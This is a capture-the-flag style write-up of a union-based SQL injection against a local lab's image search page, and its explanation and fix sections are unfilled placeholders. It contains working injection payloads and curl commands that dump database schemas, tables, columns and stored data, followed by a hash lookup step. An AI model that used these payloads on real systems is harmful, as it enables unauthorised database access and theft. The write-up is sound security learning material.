# Union Based SQL Injection in search image page

## 📖 Vulnerability Explanation
[Explain what the vulnerability is, how it works, and why it's dangerous. Include conditions required for exploitation if applicable.]

## ⚙️ Exploitation Process

- Dump databases

```
0 UNION SELECT 1,schema_name FROM information_schema.schemata; -- -
```

```
curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+1%2Cschema_name+FROM+information_schema.schemata%3B+--+-&Submit=Submit#' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.*<br\/>Title: //' | sed 's/<br\/>.*//'
```

---

- Dump tables

```
0 UNION SELECT table_name,table_schema FROM information_schema.tables; -- -
```

```
curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+table_name%2Ctable_schema+FROM+information_schema.tables%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: /\n[+] Database   : /' | sed 's/Url : /[-] Table name : /' | grep -v table
```

---

- Dump columns of table _list\_images_

```
echo -n 'list_images' | xxd -p
```

```
0 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573; -- -
```

```
curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+1%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_name%3D0x6c6973745f696d61676573%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: //' | grep -v 'Url : '
```

---

- Read columns _title_ and _comment_

```
0 UNION SELECT title,comment FROM Member_images.list_images; -- -
```

```
curl -s 'http://localhost:9090/index.php?page=searchimg&id=0+UNION+SELECT+title%2Ccomment+FROM+Member_images.list_images%3B+--+-&Submit=Submit' | grep pre | python3 -c "from bs4 import BeautifulSoup; import sys; print(BeautifulSoup(sys.stdin.read(), 'html.parser').prettify())" | sed 's/.* <br\/>//' | sed 's/<br\/>/\n/' | sed 's/<\/pre>//' | sed 's/Title: /\n[+] Title   : /' | sed 's/Url : /[-] Comment : /' | grep -v table
```

---

- Crack the hash and craft the flag using the steps provided

> IMAGE crakstation.net

```
echo -n 'albatroz' | sha256sum
```

## 🧰 Additional Resources Used

We used ```https://crackstation.net/``` to crack the hash. This page doesn't really _crack_ the hash you provide, but performs a lookup on pre-computed hashes instead.

## 🔧 Fix
[Describe how to fix the vulnerability]

## ☝️🤓 Advanced explanation
While these SQLi allowed us to read most of data present in the database, we could not read everything. After trying to read the database _Member\_Brute\_Force_, we got an error as the account used by the app on these pages did not have access to it.